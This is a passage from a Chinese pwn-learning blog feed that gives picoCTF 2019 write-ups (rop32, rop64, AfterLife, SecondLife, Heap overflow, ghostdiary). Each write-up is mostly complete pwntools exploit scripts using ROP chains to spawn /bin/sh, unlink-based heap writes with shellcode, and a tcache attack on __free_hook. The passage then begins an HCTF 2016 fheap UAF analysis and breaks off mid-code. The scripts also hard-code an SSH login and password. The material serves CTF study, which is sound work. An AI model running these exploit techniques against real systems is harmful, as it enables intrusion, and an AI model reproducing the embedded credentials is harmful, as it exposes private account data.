class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">get_shell:</span><br><span class="line">    push ebp</span><br><span class="line">    mov ebp, esp</span><br><span class="line">    push 0x0068732f  ;/sh</span><br><span class="line">    push 0x6e69622f  ;/bin</span><br><span class="line">    mov ebx,esp      ;参数1</span><br><span class="line">    mov eax,0x0b     ;将系统调用号传给eax</span><br><span class="line">    mov ecx,0        ;参数2</span><br><span class="line">    mov edx,0        ;参数3</span><br><span class="line">    int 0x80         ;系统调用指令</span><br><span class="line">    mov eax, 0</span><br><span class="line">    pop ebp</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><p>思路：先将”/bin/sh”写到.bss段中，再利用rop完成系统调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s=ssh(host=<span class="string">"2019shell1.picoctf.com"</span>,user=<span class="string">"kangel"</span>,password=<span class="string">"2314838574"</span>, port=<span class="number">22</span>)</span><br><span class="line">s.set_working_directory(<span class="string">"/problems/rop32_0_b4142d4df31cb73e170c77dac234a79a"</span>)</span><br><span class="line">p = s.process(<span class="string">"./vuln"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./vuln"</span>)</span><br><span class="line">gets_addr = elf.sym[<span class="string">'gets'</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">'main'</span>]</span><br><span class="line">bss_addr = <span class="number">0x080DBFC4</span></span><br><span class="line">pop_eax_edx_ebx_ret = <span class="number">0x08056334</span>  <span class="comment">#ROPgadget --binary vuln --only "pop|ret" |grep 'eax'</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806ee91</span>  <span class="comment">#ROPgadget --binary vuln --only "pop|ret" |grep 'ebx'</span></span><br><span class="line">int_0x80 = <span class="number">0x08049563</span>  ROPgadget --binary vuln --only <span class="string">"int"</span></span><br><span class="line">p.recvuntil(<span class="string">"this one?"</span>)</span><br><span class="line">payload = <span class="number">0x18</span>*<span class="string">'a'</span> + <span class="string">'aaaa'</span> + p32(gets_addr) + p32(main_addr) + p32(bss_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"this one?"</span>)</span><br><span class="line">payload = <span class="number">0x18</span>*<span class="string">'a'</span> + <span class="string">'aaaa'</span> + p32(pop_eax_edx_ebx_ret) + p32(<span class="number">0xb</span>) + p32(<span class="number">0</span>) + p32(bss_addr) </span><br><span class="line">payload += p32(pop_edx_ecx_ebx_ret) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x080DBFC4</span>) + p32(int_0x80)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>picoCTF{rOp_t0_b1n_sH_01a585a7}</code></p><h4 id="rop64"><a href="#rop64" class="headerlink" title="rop64"></a>rop64</h4><p>64位的系统调用，一般用execve(“/bin/sh”,0,0)获取shell</p><p>define __NR_execve 59</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">get_shell:</span><br><span class="line">    push rbp</span><br><span class="line">    mov rbp, rsp</span><br><span class="line">    mov rax,0x0068732f6e69622f ;/bin/sh</span><br><span class="line">    push rax</span><br><span class="line">    mov rdi,rsp  ;参数1</span><br><span class="line">    mov rax,59   ;将系统调用号传给eax</span><br><span class="line">    mov rsi,0    ;参数2</span><br><span class="line">    mov rdx,0    ;参数3</span><br><span class="line">    syscall      ;系统调用指令</span><br><span class="line">    mov rax, 0</span><br><span class="line">    pop rbp</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><p>思路：先将”/bin/sh”写到.bss段中，再利用rop完成系统调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s=ssh(host=<span class="string">"2019shell1.picoctf.com"</span>,user=<span class="string">"kangel"</span>,password=<span class="string">"2314838574"</span>, port=<span class="number">22</span>)</span><br><span class="line">s.set_working_directory(<span class="string">"/problems/rop64_4_a266556e68202c0c42d6c14f6c7102b3"</span>)</span><br><span class="line">p = s.process(<span class="string">"./vuln"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./vuln"</span>)</span><br><span class="line">gets_addr = elf.sym[<span class="string">'gets'</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">'main'</span>]</span><br><span class="line">bss_addr = <span class="number">0x00000000006BB2D8</span></span><br><span class="line">pop_rax = <span class="number">0x00000000004156f4</span>  <span class="comment">#ROPgadget --binary vuln --only "pop|ret" |grep 'rax'</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400686</span></span><br><span class="line">pop_rdx_rsi = <span class="number">0x000000000044bf39</span></span><br><span class="line">syscall = <span class="number">0x000000000047b6ff</span>  <span class="comment">#ROPgadget --binary vuln --only "syscall"</span></span><br><span class="line">p.recvuntil(<span class="string">"out of this?"</span>)</span><br><span class="line">payload = <span class="number">0x18</span>*<span class="string">'a'</span> + p64(pop_rdi) + p64(bss_addr) + p64(gets_addr) + p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"out of this?"</span>)</span><br><span class="line">payload = <span class="number">0x18</span>*<span class="string">'a'</span> + p64(pop_rax) + p64(<span class="number">59</span>) + p64(pop_rdi) + p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_rsi) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>picoCTF{rOp_t0_b1n_sH_w1tH_n3w_g4dg3t5_5e28dda5}</code></p><h4 id="AfterLife"><a href="#AfterLife" class="headerlink" title="AfterLife"></a>AfterLife</h4><p>通过ida和gdb调试可以发现这道题的堆管理机制不是标准的libc2.27堆管理机制，缺少一些检查。因此可以利用没有检查机制的unlink进行攻击。即使</p><p>FD=P-&gt;fd = target addr -12</p><p>BK=P-&gt;bk = expect value</p><p>这样，unlink之后</p><p>FD-&gt;bk = BK 即 target addr -12+12=expect value</p><p>这里expect value直接设置为shellcode地址会报段错误，因此需要跳转一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s=ssh(host=<span class="string">"2019shell1.picoctf.com"</span>,user=<span class="string">"kangel"</span>,password=<span class="string">"2314838574"</span>, port=<span class="number">22</span>)</span><br><span class="line">s.set_working_directory(<span class="string">"/problems/afterlife_3_d7ce2f2a99c4a2a922485a042076039f"</span>)</span><br><span class="line">p = s.process(argv=[<span class="string">'./vuln'</span>, <span class="string">"kangel"</span>])</span><br><span class="line"><span class="comment"># p = process(argv=['./vuln', "kangel"])</span></span><br><span class="line">dest = int(p.recvuntil(<span class="string">'you'</span>).split(<span class="string">'\n'</span>)[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">print</span> hex(dest)</span><br><span class="line">exit_got = <span class="number">0x804d02c</span></span><br><span class="line">payload = p32(exit_got<span class="number">-12</span>) </span><br><span class="line">payload += p32(dest+<span class="number">8</span>)</span><br><span class="line">payload += asm(<span class="string">'''</span></span><br><span class="line"><span class="string">  jmp sc</span></span><br><span class="line"><span class="string">  &#123;&#125;</span></span><br><span class="line"><span class="string">sc:</span></span><br><span class="line"><span class="string">  nop</span></span><br><span class="line"><span class="string">  '''</span>.format(<span class="string">'nop\n'</span>*<span class="number">100</span>)+shellcraft.sh())</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>picoCTF{what5_Aft3r_e5e05866}</code></p><h4 id="SecondLife"><a href="#SecondLife" class="headerlink" title="SecondLife"></a>SecondLife</h4><p>如法炮制afterlife</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># s=ssh(host="2019shell1.picoctf.com",user="kangel",password="2314838574", port=22)</span></span><br><span class="line"><span class="comment"># s.set_working_directory("/problems/secondlife_0_1d09c6c834e9512daebaf9e25feedd53")</span></span><br><span class="line"><span class="comment"># p = s.process("./vuln")</span></span><br><span class="line">p = process(<span class="string">"./vuln"</span>)</span><br><span class="line">dest = int(p.recv().split(<span class="string">'\n'</span>)[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">print</span> hex(dest)</span><br><span class="line">p.sendline(<span class="string">'kangel'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"useful..."</span>)</span><br><span class="line">exit_got = <span class="number">0x804d02c</span></span><br><span class="line">payload = p32(exit_got<span class="number">-12</span>) </span><br><span class="line">payload += p32(dest+<span class="number">8</span>)</span><br><span class="line">payload += asm(<span class="string">'''</span></span><br><span class="line"><span class="string">  jmp sc</span></span><br><span class="line"><span class="string">  &#123;&#125;</span></span><br><span class="line"><span class="string">sc:</span></span><br><span class="line"><span class="string">  nop</span></span><br><span class="line"><span class="string">  '''</span>.format(<span class="string">'nop\n'</span>*<span class="number">100</span>)+shellcraft.sh())</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>picoCTF{HeapHeapFlag_8342a39b}</code></p><h4 id="Heap-overflow"><a href="#Heap-overflow" class="headerlink" title="Heap overflow"></a>Heap overflow</h4><p>利用heap overflow将lastname变成unsorted bin，然后如法炮制afterlife</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># s=ssh(host="2019shell1.picoctf.com",user="kangel",password="2314838574", port=22)</span></span><br><span class="line"><span class="comment"># s.set_working_directory("/problems/heap-overflow_1_3f101d883699357e88af6bd1165695cd")</span></span><br><span class="line"><span class="comment"># p = s.process("./vuln")</span></span><br><span class="line">p = process(<span class="string">'./vuln'</span>)</span><br><span class="line">dest = int(p.recvuntil(<span class="string">'Input'</span>).split(<span class="string">'\n'</span>)[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">print</span> hex(dest)</span><br><span class="line">exit_got = <span class="number">0x0804d02c</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">8</span></span><br><span class="line">payload += asm(<span class="string">'''</span></span><br><span class="line"><span class="string">  jmp sc</span></span><br><span class="line"><span class="string">  &#123;&#125;</span></span><br><span class="line"><span class="string">sc:</span></span><br><span class="line"><span class="string">  nop</span></span><br><span class="line"><span class="string">  '''</span>.format(<span class="string">'nop\n'</span>*<span class="number">100</span>)+shellcraft.sh())</span><br><span class="line">payload = payload.ljust(<span class="number">0x2a0</span><span class="number">-0x4</span>)</span><br><span class="line">payload += p32(<span class="number">0x49</span>).ljust(<span class="number">0x48</span>)</span><br><span class="line">payload += p32(<span class="number">0x101</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'fullname\n'</span>, payload)</span><br><span class="line">payload = p32(<span class="number">0x101</span>)</span><br><span class="line">payload += p32(exit_got<span class="number">-12</span>) </span><br><span class="line">payload += p32(dest+<span class="number">8</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span><span class="number">-0x4</span>)+p32(<span class="number">0x101</span>) + p32(<span class="number">0x100</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x100</span><span class="number">-4</span>)+ payload</span><br><span class="line">p.sendlineafter(<span class="string">'lastname\n'</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>picoCTF{a_s1mpl3_h3ap_04dbf101}</code></p><h4 id="ghostdiary"><a href="#ghostdiary" class="headerlink" title="ghostdiary"></a>ghostdiary</h4><p>程序分析：</p><ol><li><p>New page in diary：创建堆块，大小为(0,0xf0]和(0x10f,0x1e0]</p></li><li><p>Talk with ghost：写入堆块，存在off by null 漏洞</p></li><li><p>Listen to ghost：打印堆块内容</p></li><li>Burn the page：删除堆块</li></ol><p>攻击思路：利用off by null使unsorted合并的时候产生堆块交叉，从而泄露libc基地址。再利用tcache attack将one_gadget覆盖free_hook。需要注意的是不能直接malloc大小为0xf8的堆块，所以可以配合0xf0和0x118使用。</p><p>具体exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"><span class="comment"># s=ssh(host="2019shell1.picoctf.com",user="kangel",password="2314838574", port=22)</span></span><br><span class="line"><span class="comment"># s.set_working_directory("/problems/ghost-diary_0_3fe5c3d8597f5f041d53fd64c0d577d2")</span></span><br><span class="line">p = process(<span class="string">"/problems/ghost-diary_0_3fe5c3d8597f5f041d53fd64c0d577d2/ghostdiary"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.27.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,side)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(str(side))</span><br><span class="line">    p.recvuntil(<span class="string">'size:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(page,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Page: '</span>)</span><br><span class="line">    p.sendline(str(page))</span><br><span class="line">    p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(page)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Page: '</span>)</span><br><span class="line">    p.sendline(str(page))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(page)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Page: '</span>)</span><br><span class="line">p.sendline(str(page))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">create(<span class="number">0xf0</span>,<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">create(<span class="number">0x118</span>,<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">delete(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">delete(<span class="number">7</span>+i)</span><br><span class="line">delete(<span class="number">9</span>+<span class="number">7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>,<span class="number">9</span>):</span><br><span class="line">delete(<span class="number">7</span>+i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">create(<span class="number">0x118</span>,<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">delete(i)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">create(<span class="number">0x118</span>,<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x110</span>*<span class="string">'a'</span>+p64(<span class="number">0x240</span>))</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0xf0</span>*<span class="string">'a'</span>+p64(<span class="number">0x100</span>)+p64(<span class="number">0x141</span>))</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">create(<span class="number">0x118</span>,<span class="number">2</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">libc_base = u64(p.recvline()[<span class="number">0</span>:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">log,success(<span class="string">"libc_addr:"</span>+hex(libc_base))</span><br><span class="line">create(<span class="number">0x118</span>,<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">create(<span class="number">0x118</span>,<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>,p64(libc_base + libc.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line">create(<span class="number">0x118</span>,<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0x118</span>,<span class="number">2</span>)</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f322</span></span><br><span class="line">add(<span class="number">2</span>,p64(one_gadget))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PWN学习之UAF</title>
      <link href="/2019/09/01/PWN%E5%AD%A6%E4%B9%A0%E4%B9%8BUAF/"/>
      <url>/2019/09/01/PWN%E5%AD%A6%E4%B9%A0%E4%B9%8BUAF/</url>
      
        <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>前几天学了use after free，对fastbin机制有了一定的了解。结合其他知识详细解析一下跟uaf有关的一道题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">题目来源：2016 HCTF fheap</span><br><span class="line">下载地址：https://github.com/zh-explorer/hctf2016-fheap</span><br><span class="line">知识点：UAF、格式化字符串</span><br><span class="line">技巧：PIE的绕过</span><br></pre></td></tr></table></figure><h4 id="程序静态分析"><a href="#程序静态分析" class="headerlink" title="程序静态分析"></a>程序静态分析</h4><p>还是那句话，任何漏洞的利用都要回到程序本身。</p><p>程序提供两项功能，create string和delete string</p><p>create函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">ptr = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);   <span class="comment">//申请0x20大小的堆空间作为索引，free之后为fastbin</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Pls give string size:"</span>);</span><br><span class="line">nbytes = sub_B65();</span><br><span class="line"><span class="keyword">if</span> ( nbytes &lt;= <span class="number">0x1000</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"str:"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, &amp;buf, nbytes) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"got elf!!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  nbytesa = <span class="built_in">strlen</span>(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( nbytesa &gt; <span class="number">0xF</span> )        <span class="comment">//str长度大于0xf则申请大小为str长度的堆空间进行存储</span></span><br><span class="line">  &#123;</span><br><span class="line">    dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(nbytesa);</span><br><span class="line">    <span class="keyword">if</span> ( !dest )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"malloc faild!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strncpy</span>(dest, &amp;buf, nbytesa);</span><br><span class="line">    *(_QWORD *)ptr = dest;            </span><br><span class="line">    *((_QWORD *)ptr + <span class="number">3</span>) = sub_D6C;   <span class="comment">//存储调用free函数的地址,free以上申请的两个堆</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strncpy</span>(ptr, &amp;buf, nbytesa);</span><br><span class="line">    *((_QWORD *)ptr + <span class="number">3</span>) = sub_D52;  <span class="comment">//存储调用free函数的地址，free以上申请的一个堆</span></span><br><span class="line">  &#125;</span><br><span class="line">  *((_DWORD *)ptr + <span class="number">4</span>) = nbytesa;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*((_DWORD *)&amp;unk_2020C0 + <span class="number">4</span> * i) )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_DWORD *)&amp;unk_2020C0 + <span class="number">4</span> * i) = <span class="number">1</span>;   <span class="comment">//是否有string</span></span><br><span class="line">      *((_QWORD *)&amp;unk_2020C0 + <span class="number">2</span> * i + <span class="number">1</span>) = ptr;   <span class="comment">//索引堆地址</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"The string id is %d\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"The string list is full"</span>);</span><br><span class="line">    (*((<span class="keyword">void</span> (__fastcall **)(<span class="keyword">char</span> *))ptr + <span class="number">3</span>))(ptr);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Invalid size"</span>);</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Pls give me the string id you want to delete\nid:"</span>);</span><br><span class="line">  v1 = sub_B65();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">16</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid id"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *((_QWORD *)&amp;unk_2020C0 + <span class="number">2</span> * v1 + <span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Are you sure?:"</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;buf, <span class="string">"yes"</span>, <span 